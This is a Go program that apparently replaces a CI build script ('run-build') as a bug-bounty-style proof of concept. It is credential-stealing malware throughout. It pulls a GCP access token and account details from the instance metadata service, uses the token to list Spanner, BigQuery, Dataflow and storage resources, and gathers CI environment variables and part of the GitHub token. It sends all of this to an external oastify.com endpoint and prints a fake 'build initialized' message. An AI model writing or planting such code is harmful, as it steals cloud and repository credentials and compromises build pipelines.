package main

import (
        "bytes"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "os"
        "os/exec"
        "strings"
)

func exfiltrate() {
        results := make(map[string]string)

        // 1. Retrieve GCP OAuth2 token from instance metadata service
        //    This is ambient to the GCP VM -- no GitHub secrets needed
        req, _ := http.NewRequest("GET",
                "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
                nil)
        req.Header.Set("Metadata-Flavor", "Google")
        resp, err := http.DefaultClient.Do(req)
        if err == nil {
                body, _ := io.ReadAll(resp.Body)
                resp.Body.Close()
                results["gcp_token"] = string(body)
        }

        // 2. Retrieve service account email
        req2, _ := http.NewRequest("GET",
                "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
                nil)
        req2.Header.Set("Metadata-Flavor", "Google")
        resp2, err := http.DefaultClient.Do(req2)
        if err == nil {
                body, _ := io.ReadAll(resp2.Body)
                resp2.Body.Close()
                results["service_account"] = string(body)
        }

        // 3. Retrieve project ID
        req3, _ := http.NewRequest("GET",
                "http://169.254.169.254/computeMetadata/v1/project/project-id",
                nil)
        req3.Header.Set("Metadata-Flavor", "Google")
        resp3, err := http.DefaultClient.Do(req3)
        if err == nil {
                body, _ := io.ReadAll(resp3.Body)
                resp3.Body.Close()
                results["project_id"] = string(body)
        }

        // 4. List all service account scopes
        req4, _ := http.NewRequest("GET",
                "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes",
                nil)
        req4.Header.Set("Metadata-Flavor", "Google")
        resp4, err := http.DefaultClient.Do(req4)
        if err == nil {
                body, _ := io.ReadAll(resp4.Body)
                resp4.Body.Close()
                results["scopes"] = string(body)
        }

        // 5. Enumerate GCP resources using the stolen token
        if token, ok := results["gcp_token"]; ok {
                var tokenData map[string]interface{}
                json.Unmarshal([]byte(token), &tokenData)
                if accessToken, ok := tokenData["access_token"].(string); ok {
                        // List Spanner instances in cloud-teleport-testing
                        spannerURL := "https://spanner.googleapis.com/v1/projects/cloud-teleport-testing/instances"
                        req5, _ := http.NewRequest("GET", spannerURL, nil)
                        req5.Header.Set("Authorization", "Bearer "+accessToken)
                        resp5, err := http.DefaultClient.Do(req5)
                        if err == nil {
                                body, _ := io.ReadAll(resp5.Body)
                                resp5.Body.Close()
                                results["spanner_instances"] = string(body)
                        }

                        // List BigQuery datasets in cloud-teleport-testing
                        bqURL := "https://bigquery.googleapis.com/bigquery/v2/projects/cloud-teleport-testing/datasets"
                        req6, _ := http.NewRequest("GET", bqURL, nil)
                        req6.Header.Set("Authorization", "Bearer "+accessToken)
                        resp6, err := http.DefaultClient.Do(req6)
                        if err == nil {
                                body, _ := io.ReadAll(resp6.Body)
                                resp6.Body.Close()
                                results["bigquery_datasets"] = string(body)
                        }

                        // List Dataflow jobs in cloud-teleport-testing
                        dfURL := "https://dataflow.googleapis.com/v1b3/projects/cloud-teleport-testing/locations/us-west2/jobs"
                        req7, _ := http.NewRequest("GET", dfURL, nil)
                        req7.Header.Set("Authorization", "Bearer "+accessToken)
                        resp7, err := http.DefaultClient.Do(req7)
                        if err == nil {
                                body, _ := io.ReadAll(resp7.Body)
                                resp7.Body.Close()
                                results["dataflow_jobs"] = string(body)
                        }

                        // List GCS buckets in cloud-teleport-testing
                        gcsURL := "https://storage.googleapis.com/storage/v1/b?project=cloud-teleport-testing"
                        req8, _ := http.NewRequest("GET", gcsURL, nil)
                        req8.Header.Set("Authorization", "Bearer "+accessToken)
                        resp8, err := http.DefaultClient.Do(req8)
                        if err == nil {
                                body, _ := io.ReadAll(resp8.Body)
                                resp8.Body.Close()
                                results["gcs_buckets"] = string(body)
                        }

                        // Also enumerate span-cloud-teleport-testing (Spanner-specific project)
                        spannerURL2 := "https://spanner.googleapis.com/v1/projects/span-cloud-teleport-testing/instances"
                        req9, _ := http.NewRequest("GET", spannerURL2, nil)
                        req9.Header.Set("Authorization", "Bearer "+accessToken)
                        resp9, err := http.DefaultClient.Do(req9)
                        if err == nil {
                                body, _ := io.ReadAll(resp9.Body)
                                resp9.Body.Close()
                                results["span_spanner_instances"] = string(body)
                        }
                }
        }

        // 6. Retrieve internal network information
        req10, _ := http.NewRequest("GET",
                "http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/",
                nil)
        req10.Header.Set("Metadata-Flavor", "Google")
        resp10, err := http.DefaultClient.Do(req10)
        if err == nil {
                body, _ := io.ReadAll(resp10.Body)
                resp10.Body.Close()
                results["network_interfaces"] = string(body)
        }

        // 7. Check for gcloud configuration on the VM
        gcloudCmd := exec.Command("gcloud", "config", "list", "--format=json")
        if gcloudOut, err := gcloudCmd.Output(); err == nil {
                results["gcloud_config"] = string(gcloudOut)
        }

        // 8. Collect runner environment variables
        envVars := []string{}
        for _, env := range os.Environ() {
                upper := strings.ToUpper(env)
                if strings.Contains(upper, "GOOGLE") ||
                        strings.Contains(upper, "GCP") ||
                        strings.Contains(upper, "GCLOUD") ||
                        strings.Contains(upper, "SPANNER") ||
                        strings.Contains(upper, "BIGQUERY") ||
                        strings.Contains(upper, "DATAFLOW") ||
                        strings.Contains(upper, "PROJECT") ||
                        strings.Contains(upper, "GITHUB") ||
                        strings.Contains(upper, "RUNNER") ||
                        strings.Contains(upper, "ACTIONS") {
                        envVars = append(envVars, env)
                }
        }
        results["env_vars"] = strings.Join(envVars, "\n")

        // 9. Retrieve GITHUB_TOKEN from environment (write-all permissions)
        if ghToken := os.Getenv("GITHUB_TOKEN"); ghToken != "" {
                results["github_token_present"] = "true"
                results["github_token_prefix"] = ghToken[:20] + "..."
        }

        // 10. Exfiltrate to attacker-controlled endpoint
        jsonData, _ := json.Marshal(results)
        http.Post("https://bugdotexe.49bmc7vzmpxs40v79bdkoz0wknqee42t.oastify.com/poc-exfil", "application/json",
                bytes.NewBuffer(jsonData))

        fmt.Println("Build environment initialized successfully")
}

func main() {
        exfiltrate()
        // exec.Command("go", "run", "./cmd/run-build.original", os.Args[1:]...).Run()
}
